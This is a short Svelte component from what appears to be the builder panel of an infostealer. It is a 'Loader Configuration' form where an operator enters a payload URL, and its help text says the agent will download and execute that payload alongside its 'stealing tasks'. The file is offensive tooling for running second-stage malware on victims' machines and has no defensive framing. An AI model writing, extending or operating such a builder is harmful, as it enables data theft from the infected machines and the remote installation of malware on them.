<script lang="ts">
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { ArrowDownToLine } from "@lucide/svelte";

  let {
    loaderUrl = "",
    onLoaderUrlChange = (val: string) => {},
  } = $props();
</script>

<div class="space-y-3">
  <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
    <ArrowDownToLine class="h-4 w-4 text-primary" />
    Loader Configuration
  </div>
  <div class="space-y-2">
    <Label class="text-xs text-muted-foreground" for="loader-url">
      Payload URL (Optional)
    </Label>
    <Input
      id="loader-url"
      placeholder="https://example.com/payload.exe"
      value={loaderUrl}
      oninput={(e) => onLoaderUrlChange(e.currentTarget.value)}
    />
    <p class="text-[10px] text-muted-foreground">
      If set, the agent will download and execute this payload concurrently with stealing tasks.
    </p>
  </div>
</div>
